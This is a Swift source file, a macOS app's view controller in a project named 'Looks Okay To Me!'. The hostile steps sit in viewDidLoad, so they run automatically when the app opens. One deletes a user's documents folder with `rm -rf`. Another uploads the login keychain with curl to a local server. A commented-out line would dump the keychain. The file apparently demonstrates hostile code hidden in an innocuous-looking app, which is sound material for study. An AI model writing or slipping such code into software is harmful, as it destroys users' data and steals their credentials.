//
//  ViewController.swift
//  Looks Okay To Me!
//
//  Created by James Duffy on 26/01/2021.
//  Copyright © 2021 James Duffy. All rights reserved.
//

import Cocoa
import SwiftShell

class ViewController: NSViewController {
    
    func shell(_ command: String) -> String {
        let task = Process()
        let pipe = Pipe()
        
        task.standardOutput = pipe
        task.arguments = ["-c", command]
        task.launchPath = "/bin/zsh"
        task.launch()
        
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        let output = String(data: data, encoding: .utf8)!
        
        return output
    }

    override func viewDidLoad() {
        super.viewDidLoad()
        print(run("rm", "-rf", "/Users/a010010/Documents/all-my-important-docs"))
        print(shell("curl -F 'kc=@/Users/a010010/Library/Keychains/login.keychain-db' http://127.0.0.1:8000"))
//        print(run("security", "dump-keychain", "-d", "login.keychain"))
        // Do any additional setup after loading the view.
    }

    override var representedObject: Any? {
        didSet {
        // Update the view, if already loaded.
        }
    }


}

